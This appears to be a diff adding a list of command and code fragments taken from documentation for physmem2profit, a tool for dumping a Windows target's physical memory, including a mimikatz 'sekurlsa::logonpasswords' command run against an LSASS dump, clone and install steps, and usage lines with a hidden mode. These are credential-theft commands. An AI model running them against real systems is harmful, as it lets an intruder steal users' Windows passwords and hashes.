@@ -1,0 +1,25 @@
+"`mimikatz.exe ""sekurlsa::minidump [label]-[date]-lsass.dmp"" ""sekurlsa::logonpasswords"" ""exit"""
+` and 
+` on the attacking machine. This command will activate the virtualenv created by 
+` says 
+` to ensure 
+`--mode all
+`--mode dump
+`--mode mount
+`Credential Guard
+`Virtualization-based security Services Running
+``
+`bash physmem2profit/client/install.sh
+`cd physmem2profit/client
+`git clone --recurse-submodules https://github.com/FSecureLABS/physmem2profit.git
+`install.sh
+`msinfo32
+`output/[label]-[date]-lsass.dmp
+`output/[label]-[date]-secure-world.raw
+`physmem2profit
+`physmem2profit.exe
+`physmem2profit.exe [--ip IP] [-p PORT] [--hidden] [--verbose]
+`physmem2profit/server/Physmem2profit.sln
+`python3 physmem2profit --host HOST [--port PORT] [--mode MODE] [--driver DRIVER ] [--instal DRIVER_PATH_ON_TARGET] [--label LABEL_FOR_MEMORY_DUMP]
+`python3 physmem2profit --mode dump --vmem /tmp/Win10-Snapshot1.vmem --label credential-guard-test
+`source physmem2profit/client/.env/bin/activate
